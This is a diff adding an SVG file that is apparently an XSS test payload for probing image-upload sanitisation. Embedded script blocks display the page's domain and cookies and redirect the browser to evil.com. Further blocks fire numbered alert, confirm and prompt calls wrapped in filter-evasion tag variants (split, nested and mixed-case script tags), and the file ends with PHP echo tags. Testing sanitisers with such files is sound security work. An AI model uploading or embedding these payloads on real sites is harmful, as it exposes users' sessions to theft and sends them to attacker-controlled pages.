@@ -1,0 +1,35 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert("You have been hacked !! " + "\n" + "Domain: " + document.domain + "\n" + "Cookie: " + document.cookie );
+      window.location.href="https://evil.com"
+   </script>
+	 <script>
+        confirm(1111);
+        prompt(1112);
+        alert(1113);
+        alert(prompt(confirm(1114)));
+    </script>
+    <scr<script>ipt>
+        confirm(2221);
+        prompt(2222);
+        alert(2223);
+        alert(prompt(confirm(2224)));
+    </scr</script>ipt>
+    <scrscriptipt>
+        confirm(3331);
+        prompt(3332);
+        alert(3333);
+        alert(prompt(confirm(3334)));
+    </scrscriptipt>
+    <sCrIPt>
+        confirm(4441);
+        prompt(4442);
+        alert(4443);
+        alert(prompt(confirm(4444)));
+    </sCrIPt>
+    <?= 5551;?>
+    <?php echo 5552;?>
+</svg>
